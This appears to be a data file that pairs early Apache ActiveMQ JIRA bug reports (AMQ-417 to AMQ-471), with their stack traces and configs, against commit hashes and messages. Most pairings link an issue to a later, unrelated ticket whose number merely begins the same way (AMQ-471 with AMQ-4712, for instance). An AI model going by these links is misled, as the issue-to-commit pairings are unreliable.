12481530,AMQ-471,"The recent JMX querying options added the broker Main class has added a dependency on having jmx on the classpath.  Part of Main's function is to establish the classpath so that shell scripts don't have to.  We should look into breaking the Main class so that it delegates handling the command line arguments to a class that's loaded using reflection so that it can establish that right classpath.

On java 1.4

$ ./activemq 
Exception in thread ""main"" java.lang.NoClassDefFoundError: javax/management/ObjectName

",18e163de5e12fe8b88e5ce0b60cec461948573a5,Added @Ignore to testReceiveMessageSentWhileOffline as it was failing regularly on both.  See AMQ-4712
12481565,AMQ-465,"Background here: http://forums.logicblaze.com/posts/list/146.page

It seems to be VM protocol specific",4a270fe1f0bf78087e1f7ed342f30b80e06a1559,"apply patch for: https://issues.apache.org/jira/browse/AMQ-4655

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1507346 13f79535-47bb-0310-9956-ffa450edef68"
12481565,AMQ-465,"Background here: http://forums.logicblaze.com/posts/list/146.page

It seems to be VM protocol specific",ccde93a238b8882818d724c665787d547cc289e7,"https://issues.apache.org/jira/browse/AMQ-4656 - adding a test

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1511334 13f79535-47bb-0310-9956-ffa450edef68"
12481565,AMQ-465,"Background here: http://forums.logicblaze.com/posts/list/146.page

It seems to be VM protocol specific",ddd4d9fff2c381e81bc44519777a37802b19df8d,"fix add missing file from https://issues.apache.org/jira/browse/AMQ-4655

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1511780 13f79535-47bb-0310-9956-ffa450edef68"
12481484,AMQ-464,"For background: http://forums.logicblaze.com/posts/list/116.page

I've created a test case which demonstrates the issue in the assembly module...

TwoBrokerTopicSendReceiveLotsOfMessagesUsingTcpTest.java

You might want to enable log4j logging to see the messages that are received",935ce6596843f0b505a1f79dc30b9f9984853f24,"added test case for AMQ-464

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@366119 13f79535-47bb-0310-9956-ffa450edef68"
12481484,AMQ-464,"For background: http://forums.logicblaze.com/posts/list/116.page

I've created a test case which demonstrates the issue in the assembly module...

TwoBrokerTopicSendReceiveLotsOfMessagesUsingTcpTest.java

You might want to enable log4j logging to see the messages that are received",3940f2dffd7f6c26710b016b0065b1a5621ea61f,"https://issues.apache.org/jira/browse/AMQ-4640


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1506079 13f79535-47bb-0310-9956-ffa450edef68"
12481484,AMQ-464,"For background: http://forums.logicblaze.com/posts/list/116.page

I've created a test case which demonstrates the issue in the assembly module...

TwoBrokerTopicSendReceiveLotsOfMessagesUsingTcpTest.java

You might want to enable log4j logging to see the messages that are received",29b90b58129e7a78cc00dabde923002da133efdf,https://issues.apache.org/jira/browse/AMQ-4643 - have keepAlive task trap the new suppressreplyexception such that it can stay alive and renew a lease on resumption
12481405,AMQ-461,<NA>,d06b32bab3ad3c98c7802ce3955ab8512d449cde,"PR: AMQ-461
Submitted by: Bill Dudney
m2 poms need patches

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@365390 13f79535-47bb-0310-9956-ffa450edef68"
12481426,AMQ-457,"If physics network is interrupted and resumed ,the two server channels cann't resume.",6e57f3a346ece480d51c89a4b7591b770298f394,"AMQ-4571: JUnit test added

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1489823 13f79535-47bb-0310-9956-ffa450edef68"
12481426,AMQ-457,"If physics network is interrupted and resumed ,the two server channels cann't resume.",767a59dfc41338cab5925af2a110e6f6c83e9308,"AMQ-4571: JUnit test added with broker configuration

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1489880 13f79535-47bb-0310-9956-ffa450edef68"
12481426,AMQ-457,"If physics network is interrupted and resumed ,the two server channels cann't resume.",539a5f162ebb328c068b214ad582e86b2a50e556,"fix and test for: https://issues.apache.org/jira/browse/AMQ-4575

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1490343 13f79535-47bb-0310-9956-ffa450edef68"
12481391,AMQ-446,"(DurableQueueBoundedMessageContainer.java:390) - <stop dispatching>
java.lang.NullPointerException
	at
org.activemq.ActiveMQConnectionConsumer.dispatchToQueue(ActiveMQConnectionCo
nsumer.java:128)
	at
org.activemq.ActiveMQConnectionConsumer.dispatch(ActiveMQConnectionConsumer.
java:116)
	at
org.activemq.ActiveMQConnection.consume(ActiveMQConnection.java:1056)
",d3790761963ca9957aff5bfe85748087ee3c8250,"Test for: https://issues.apache.org/jira/browse/AMQ-4468

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1487008 13f79535-47bb-0310-9956-ffa450edef68"
12481422,AMQ-443,"The current implementation of KeepAliveDaemon.java will sometimes force disconnections on well behaved connections.  The problem may arrise if there is a connection which goes away, and the KeepAlive send to that channel blocks while attempting to reconnect.  If this reconnection takes a while, then other channels that were responding fine may get their connections broken.  This happens due to the following code in KeepAliveDaemon.java:

		if ((channel.getLastReceiptTimestamp() + channel.getKeepAliveTimeout() * 2) < System.currentTimeMillis()) {
or
		} else if ((channel.getLastReceiptTimestamp() + channel.getKeepAliveTimeout()) < System.currentTimeMillis()) {

The fact that the receipt timestamp is checked against System.currentTimeMillis() causes the code to break otherwise good connections.  If a KeepAlive send (in examineChannel) for a broken channel takes longer than some good channel's KeepAliveTimeout, then the good connection gets broken.

This can, in turn, cause some pretty bad behavior in the Broker.  While testing and diagnosing this problem, I could some brokers in a network of brokers stuck.  The sequence of events during recovery, which get interrupted due to closing the connections, would sometimes lead to the broker hanging waiting for a receipt, such as during an addConsumer (which eventually calls syncSendWithReceipt).

I have redone the logic in KeepAliveDaemon.java (which required a small change to ReliableTransportChannel as well).  This now seems to work.

I'm a bit concerned about the blocking calls, though.  This may be a different issue / bug.  I thought it looked like there was a mechanism to cancel outstanding receipt waiters - but, every once in a while that mechanism would not get called.  This results in the broker basically getting stuck, and does not ever really recover.
",ef6beb78fe483cab855ec5f76052616890e06f71,"https://issues.apache.org/jira/browse/AMQ-4432 - ensure camel-*.xsd can be found locally

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1463923 13f79535-47bb-0310-9956-ffa450edef68"
12481422,AMQ-443,"The current implementation of KeepAliveDaemon.java will sometimes force disconnections on well behaved connections.  The problem may arrise if there is a connection which goes away, and the KeepAlive send to that channel blocks while attempting to reconnect.  If this reconnection takes a while, then other channels that were responding fine may get their connections broken.  This happens due to the following code in KeepAliveDaemon.java:

		if ((channel.getLastReceiptTimestamp() + channel.getKeepAliveTimeout() * 2) < System.currentTimeMillis()) {
or
		} else if ((channel.getLastReceiptTimestamp() + channel.getKeepAliveTimeout()) < System.currentTimeMillis()) {

The fact that the receipt timestamp is checked against System.currentTimeMillis() causes the code to break otherwise good connections.  If a KeepAlive send (in examineChannel) for a broken channel takes longer than some good channel's KeepAliveTimeout, then the good connection gets broken.

This can, in turn, cause some pretty bad behavior in the Broker.  While testing and diagnosing this problem, I could some brokers in a network of brokers stuck.  The sequence of events during recovery, which get interrupted due to closing the connections, would sometimes lead to the broker hanging waiting for a receipt, such as during an addConsumer (which eventually calls syncSendWithReceipt).

I have redone the logic in KeepAliveDaemon.java (which required a small change to ReliableTransportChannel as well).  This now seems to work.

I'm a bit concerned about the blocking calls, though.  This may be a different issue / bug.  I thought it looked like there was a mechanism to cancel outstanding receipt waiters - but, every once in a while that mechanism would not get called.  This results in the broker basically getting stuck, and does not ever really recover.
",77fe814b9ec7970cec70833be0754fa8345eac38,"fix for: https://issues.apache.org/jira/browse/AMQ-4435

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1464568 13f79535-47bb-0310-9956-ffa450edef68"
12481518,AMQ-441,"Details in tim's second post...

http://forums.logicblaze.com/posts/list/68.page

The first scenario was just a pre-fetch issue. The scenario with 1M messages on the queue sounds bizarre.",92b6bd23cf8f387ce1042f64b7f2a4a237898408,"https://issues.apache.org/jira/browse/AMQ-4415 - fix test regression, stop the autofail support

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1504436 13f79535-47bb-0310-9956-ffa450edef68"
12481439,AMQ-429,"Reported at

http://forums.logicblaze.com/posts/list/22.page",6a097b97fe0ae316de93280271f31dffddd4bbbe,"https://issues.apache.org/jira/browse/AMQ-4296 - disable leveldb durable bits pending more work for 5.9

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1442953 13f79535-47bb-0310-9956-ffa450edef68"
12481439,AMQ-429,"Reported at

http://forums.logicblaze.com/posts/list/22.page",548e52cde4d5f07f328b5ec56109026d9500ffdf,"another leveldb scenario that needs some investigation, but use case seems dubious - https://issues.apache.org/jira/browse/AMQ-4296

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1447700 13f79535-47bb-0310-9956-ffa450edef68"
12481439,AMQ-429,"Reported at

http://forums.logicblaze.com/posts/list/22.page",5b5a818f4db6a472b194b2d2679b9212952272d9,"more exclusions - https://issues.apache.org/jira/browse/AMQ-4296

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1447725 13f79535-47bb-0310-9956-ffa450edef68"
12481439,AMQ-429,"Reported at

http://forums.logicblaze.com/posts/list/22.page",b6703d6bd7b65cdd2175616bec59bcd1915f9a9c,"Fixes failing ThreeBrokerVirtualTopicNetwork test associated /w AMQ-4296

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1483878 13f79535-47bb-0310-9956-ffa450edef68"
12481443,AMQ-428,<NA>,0b09fde97cba544fb0f31de72ce89202bdb97c6e,"Apply patch for: https://issues.apache.org/jira/browse/AMQ-4281

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1440012 13f79535-47bb-0310-9956-ffa450edef68"
12481538,AMQ-425,"t1. TransportConnector.stop is invoked
t1.1. which invokes TcpTransportServer.doStop, which does serverSocket.close
t1.2. stop then blocks on runner.join (waiting for the thread to complete)

in the mean time, the TcpTransportServer has a thread that is blocked in its run method on serverSocket.accept

t2.1. serverSocket.accept unblocks with a SocketException
t2.2. in the catch block, TransportServerThreadSupport.isClosed is invoked, which returns false because closed.set(true) is not invoked until t1.2 unblocks on the thread
t2.3 so onAcceptError(e) is invoked, which logs the error

by this time the thread at t1.2 is unbocked, sets the closed flag, etc, etc, and the broker finishes its shutdown.

Seems that there needs to be some flag that indicates the transport-server is in the process of shutting down, maybe something like:

TcpTransportServer.run():
    ...
    catch (Exception e) { 
        ...
        if (!isClosing()) {
            onAcceptError(e);
        }
    ...",7011ea5b132509878e031c4347671904569c77c1,"fix for: https://issues.apache.org/jira/browse/AMQ-4254

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1433683 13f79535-47bb-0310-9956-ffa450edef68"
12481538,AMQ-425,"t1. TransportConnector.stop is invoked
t1.1. which invokes TcpTransportServer.doStop, which does serverSocket.close
t1.2. stop then blocks on runner.join (waiting for the thread to complete)

in the mean time, the TcpTransportServer has a thread that is blocked in its run method on serverSocket.accept

t2.1. serverSocket.accept unblocks with a SocketException
t2.2. in the catch block, TransportServerThreadSupport.isClosed is invoked, which returns false because closed.set(true) is not invoked until t1.2 unblocks on the thread
t2.3 so onAcceptError(e) is invoked, which logs the error

by this time the thread at t1.2 is unbocked, sets the closed flag, etc, etc, and the broker finishes its shutdown.

Seems that there needs to be some flag that indicates the transport-server is in the process of shutting down, maybe something like:

TcpTransportServer.run():
    ...
    catch (Exception e) { 
        ...
        if (!isClosing()) {
            onAcceptError(e);
        }
    ...",77312e5a6487dd2bd384bf3cf167cef6b61aa658,"Fixes AMQ-4258: Endless loop when received incorrect AMQP message

Applied patch sumbitted by Robert Balent.  Many thanks!



git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1437427 13f79535-47bb-0310-9956-ffa450edef68"
12481647,AMQ-422,"I'm trying to create a distributed topic between two servers for high availability (pretty much as described in http://activemq.codehaus.org/Networks+of+Brokers).  Both of the servers want to produce/consume messages to/from this topic.

The config looks like this:

<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE beans PUBLIC  ""-//ACTIVEMQ//DTD//EN"" ""http://activemq.org/dtd/activemq.dtd"">
<beans>
  <broker>
    <connector>
      <tcpServerTransport uri=""tcp://SERVER1:61616"" backlog=""1000"" useAsyncSend=""true"" maxOutstandingMessages=""50""/>
    </connector>    
    <networkConnector>      
      <networkChannel uri=""reliable:tcp://SERVER2:61616"" remoteBrokerName=""whocares""/>    
    </networkConnector>    
    <persistence>      
      <vmPersistence/>    
    </persistence>   
  </broker>
</beans>

Initial setup is fine, and upon starting both servers they connect and happily message with each other. However, problems arise if one of the servers is restarted or if a network outage occurs.

If one server (SERVER1, say) is stopped and restarted, reconnection occurs but messages are then received twice by the other server (SERVER2 - the one that was not stopped).  The activeMQ logging I get from SERVER2 on reconnect is:

14:56:16,765 channel status changed: Channel: tcp://192.168.1.171:61616 has reconnected
14:56:16,890 Adding new client: ID:elephant-3033-1132757775296-0:0_NetworkChannel on transport: TcpTransportChannel: Socket[addr=/192.168.1.172,port=3035,localport=61615]

but after this all messages are received once on SERVER1 and twice on SERVER2.
I could just about live with that, but...

...if both servers are running but encounter a network outage (ie. I disable then re-enable the network of one machine) I get one of two situations:
1) Both servers appear to reconnect, but neither one receives *any* messages any more, or
2) The servers reconnect, but upon one server posting to the topic, both are sent into an infinite loop receiving the same message for ever. 

I've attached an eclipse project with some simple test classes.  Run ""Main"" on two machines and specify the local host/port and remote host/port as arguments to the Main class.

",c73027da1af8a36b8a01a82a87c64a874729a3b4,"https://issues.apache.org/jira/browse/AMQ-4221 - fix dangling reference to free page

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1421373 13f79535-47bb-0310-9956-ffa450edef68"
12481553,AMQ-420,Each client connection is established the ManagedTransportConnector class assign a sequential connection id.  It would be more helpful if the clientid supplies by the client were used as the id.,dcbb19509435703ebb16e1da65a8029206fbbe66,"Fixes AMQ-4201 : JMSX* properties not included in the getPropertyNames() enumeration

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1416515 13f79535-47bb-0310-9956-ffa450edef68"
12481453,AMQ-419,"With the removal of the TransportStatusListener interface the client lost the ability to obtain useful information from connection/disconnect events.  Similar information can be garnered by creating a TransportListener object and chaining it to the ActiveMQConnection class.  Connection detection can be determined by trapping the BrokerInfo object in the onCommand method and disconnect detected in the onException method. However the BrokerInfo object does not contain the brokerName defined in the configuration file.

",ed96e2ec08d2f32f3bc8ad2576663cd6ccf7a1d9,"https://issues.apache.org/jira/browse/AMQ-4191 - prototype of the Status MBean

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1415159 13f79535-47bb-0310-9956-ffa450edef68"
12481453,AMQ-419,"With the removal of the TransportStatusListener interface the client lost the ability to obtain useful information from connection/disconnect events.  Similar information can be garnered by creating a TransportListener object and chaining it to the ActiveMQConnection class.  Connection detection can be determined by trapping the BrokerInfo object in the onCommand method and disconnect detected in the onException method. However the BrokerInfo object does not contain the brokerName defined in the configuration file.

",fc706d074ae7992ff91cb1c428ed46662c6e6ab5,"https://issues.apache.org/jira/browse/AMQ-4196 - Christian nice test

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1415409 13f79535-47bb-0310-9956-ffa450edef68"
12481453,AMQ-419,"With the removal of the TransportStatusListener interface the client lost the ability to obtain useful information from connection/disconnect events.  Similar information can be garnered by creating a TransportListener object and chaining it to the ActiveMQConnection class.  Connection detection can be determined by trapping the BrokerInfo object in the onCommand method and disconnect detected in the onException method. However the BrokerInfo object does not contain the brokerName defined in the configuration file.

",96f29456e9cd2f085b988a6f1b8a85fed6e081e3,"Fix for https://issues.apache.org/jira/browse/AMQ-4190 - Figure out what was intended with transactions and producer flow control for topics

Fix the counter so the logging happens

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1418378 13f79535-47bb-0310-9956-ffa450edef68"
12481539,AMQ-418,"I think I can answer my own question.  The test of the command should be in the ControlCommand.visit() method.  The CommandVisitor interface of implemented by the TransportConnection already has a processShutdown() method, but I don't think this was meant for JVM level termination.

Dennis Cook wrote:

> Okay I thought I had figured out how to cause a broker shutdown.
>
> I found the onControlCommand method in the ActiveMQConnection class. Great figured just asyncSendPacket() a ControlCommand with ""shutdown"" as command.
>
> First problem found and fixed was command member of ControlCommand was not marshalled.  Next found that the ActiveMQConnection is not part of the filter chain on the broker side.
>
> It seems that an anonymous TransportListener is created, in the TransportConnection contructor, to perform the dispatch. On the surface this seems to me like the appropriate place to replicate the onControlCommand method that I found in the ActiveMQConnection class.
>
> Is the the correct approach or am I off base here?
>
>
>
> Dennis Cook wrote:
>
>> I had added the terminateBrokerVM() method to ActiveMQConnetion in v3 until there was a better way to terminate, from a remote location, the JVM running a broker.  This has been removed from v4 source, but still I cannot find a way to tell the broker JVM to shutdown cleanly.
>>
>> What is the intention for this this vesion? Is it intended that this be accomplished via JMX? I have already tried JConsole and issued STOP on both the broker and connector objects, but the JVM did not stop.
>>
",c899492af8205ac007a9295608d3af77615eb75c,"some fixes for: https://issues.apache.org/jira/browse/AMQ-4182

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1413703 13f79535-47bb-0310-9956-ffa450edef68"
12481539,AMQ-418,"I think I can answer my own question.  The test of the command should be in the ControlCommand.visit() method.  The CommandVisitor interface of implemented by the TransportConnection already has a processShutdown() method, but I don't think this was meant for JVM level termination.

Dennis Cook wrote:

> Okay I thought I had figured out how to cause a broker shutdown.
>
> I found the onControlCommand method in the ActiveMQConnection class. Great figured just asyncSendPacket() a ControlCommand with ""shutdown"" as command.
>
> First problem found and fixed was command member of ControlCommand was not marshalled.  Next found that the ActiveMQConnection is not part of the filter chain on the broker side.
>
> It seems that an anonymous TransportListener is created, in the TransportConnection contructor, to perform the dispatch. On the surface this seems to me like the appropriate place to replicate the onControlCommand method that I found in the ActiveMQConnection class.
>
> Is the the correct approach or am I off base here?
>
>
>
> Dennis Cook wrote:
>
>> I had added the terminateBrokerVM() method to ActiveMQConnetion in v3 until there was a better way to terminate, from a remote location, the JVM running a broker.  This has been removed from v4 source, but still I cannot find a way to tell the broker JVM to shutdown cleanly.
>>
>> What is the intention for this this vesion? Is it intended that this be accomplished via JMX? I have already tried JConsole and issued STOP on both the broker and connector objects, but the JVM did not stop.
>>
",ec0a0a3ebe72bb78b6cbb3d14af558b723b55f4b,"https://issues.apache.org/jira/browse/AMQ-4180 - fix regression in org.apache.activemq.broker.BrokerRedeliveryTest

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1415404 13f79535-47bb-0310-9956-ffa450edef68"
12481539,AMQ-418,"I think I can answer my own question.  The test of the command should be in the ControlCommand.visit() method.  The CommandVisitor interface of implemented by the TransportConnection already has a processShutdown() method, but I don't think this was meant for JVM level termination.

Dennis Cook wrote:

> Okay I thought I had figured out how to cause a broker shutdown.
>
> I found the onControlCommand method in the ActiveMQConnection class. Great figured just asyncSendPacket() a ControlCommand with ""shutdown"" as command.
>
> First problem found and fixed was command member of ControlCommand was not marshalled.  Next found that the ActiveMQConnection is not part of the filter chain on the broker side.
>
> It seems that an anonymous TransportListener is created, in the TransportConnection contructor, to perform the dispatch. On the surface this seems to me like the appropriate place to replicate the onControlCommand method that I found in the ActiveMQConnection class.
>
> Is the the correct approach or am I off base here?
>
>
>
> Dennis Cook wrote:
>
>> I had added the terminateBrokerVM() method to ActiveMQConnetion in v3 until there was a better way to terminate, from a remote location, the JVM running a broker.  This has been removed from v4 source, but still I cannot find a way to tell the broker JVM to shutdown cleanly.
>>
>> What is the intention for this this vesion? Is it intended that this be accomplished via JMX? I have already tried JConsole and issued STOP on both the broker and connector objects, but the JVM did not stop.
>>
",5bfbc542b1349895dff5a52408302c59323f6aa4,"https://issues.apache.org/jira/browse/AMQ-4181 - remove the browser imidiatelly when finished

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1417331 13f79535-47bb-0310-9956-ffa450edef68"
12481539,AMQ-418,"I think I can answer my own question.  The test of the command should be in the ControlCommand.visit() method.  The CommandVisitor interface of implemented by the TransportConnection already has a processShutdown() method, but I don't think this was meant for JVM level termination.

Dennis Cook wrote:

> Okay I thought I had figured out how to cause a broker shutdown.
>
> I found the onControlCommand method in the ActiveMQConnection class. Great figured just asyncSendPacket() a ControlCommand with ""shutdown"" as command.
>
> First problem found and fixed was command member of ControlCommand was not marshalled.  Next found that the ActiveMQConnection is not part of the filter chain on the broker side.
>
> It seems that an anonymous TransportListener is created, in the TransportConnection contructor, to perform the dispatch. On the surface this seems to me like the appropriate place to replicate the onControlCommand method that I found in the ActiveMQConnection class.
>
> Is the the correct approach or am I off base here?
>
>
>
> Dennis Cook wrote:
>
>> I had added the terminateBrokerVM() method to ActiveMQConnetion in v3 until there was a better way to terminate, from a remote location, the JVM running a broker.  This has been removed from v4 source, but still I cannot find a way to tell the broker JVM to shutdown cleanly.
>>
>> What is the intention for this this vesion? Is it intended that this be accomplished via JMX? I have already tried JConsole and issued STOP on both the broker and connector objects, but the JVM did not stop.
>>
",3c776cfc444b145d6db294813bc24f49b38da075,"fix for: https://issues.apache.org/jira/browse/AMQ-4188

Adds dstat command

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1518321 13f79535-47bb-0310-9956-ffa450edef68"
12481573,AMQ-417,"Performing full maven build, the following JUnit test for the optional module fails due to expired certificates used in the test -

    [junit] [ERROR] TEST org.activemq.transport.ssl.SslTransportChannelTest FAILED

Both of the certs in the modules\optional\src\test\client.keystore and server.keystore files have expired -
Your keystore contains 1 entry

Alias name: mykey
Creation date: Feb 3, 2005
Entry type: keyEntry
Certificate chain length: 1
Certificate[1]:
Owner: CN=localhost, OU=activemq.org, O=activemq.org, L=LA, ST=CA, C=US
Issuer: CN=localhost, OU=activemq.org, O=activemq.org, L=LA, ST=CA, C=US
Serial number: 4202b790
Valid from: 2/3/05 6:45 PM until: 5/4/05 7:45 PM
Certificate fingerprints:
         MD5:  C1:E4:37:34:0F:A3:C3:C4:6F:AA:F1:AC:59:B1:1D:00
         SHA1: 75:FF:D1:D0:AD:89:88:9A:68:57:B4:06:80:A1:79:80:4F:91:74:F5


Testsuite: org.activemq.transport.ssl.SslTransportChannelTest
Tests run: 4, Failures: 4, Errors: 0, Time elapsed: 2.718 sec

------------- Standard Output ---------------
Server has started
addClient() with receiver: TcpTransportChannel: Socket[addr=/127.0.0.1,port=2420,localport=61617]
Sending packets
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Receiver has started
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Stopping sender
Receiver will be closed by the server
Stopping server
Server has started
addClient() with receiver: TcpTransportChannel: Socket[addr=/127.0.0.1,port=2421,localport=61617]
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Receiver has started
Stopping sender
Receiver will be closed by the server
Stopping server
Server has started
addClient() with receiver: TcpTransportChannel: Socket[addr=/127.0.0.1,port=2422,localport=61617]
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Receiver has started
Reason: java.net.SocketException: Socket is closed
Stopping sender
Receiver will be closed by the server
Stopping server
Server has started
addClient() with receiver: TcpTransportChannel: Socket[addr=/127.0.0.1,port=2423,localport=61617]
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Stopping sender
Receiver will be closed by the server
Stopping server
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Receiver has started
------------- ---------------- ---------------
------------- Standard Error -----------------
Failure starting receiver: 
javax.jms.JMSException: start failed: certificate expired
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:199)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	... 5 more
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
Sender got an exception:
javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired
	at org.activemq.util.JMSExceptionHelper.newJMSException(JMSExceptionHelper.java:49)
	at org.activemq.transport.tcp.TcpTransportChannel.doClose(TcpTransportChannel.java:513)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:330)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	... 1 more
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	at java.lang.Thread.run(Thread.java:570)
Sender got an exception:
javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired
	at org.activemq.util.JMSExceptionHelper.newJMSException(JMSExceptionHelper.java:49)
	at org.activemq.transport.tcp.TcpTransportChannel.doClose(TcpTransportChannel.java:513)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:330)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	... 1 more
Failure starting receiver: 
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	at java.lang.Thread.run(Thread.java:570)
javax.jms.JMSException: start failed: certificate expired
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:199)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
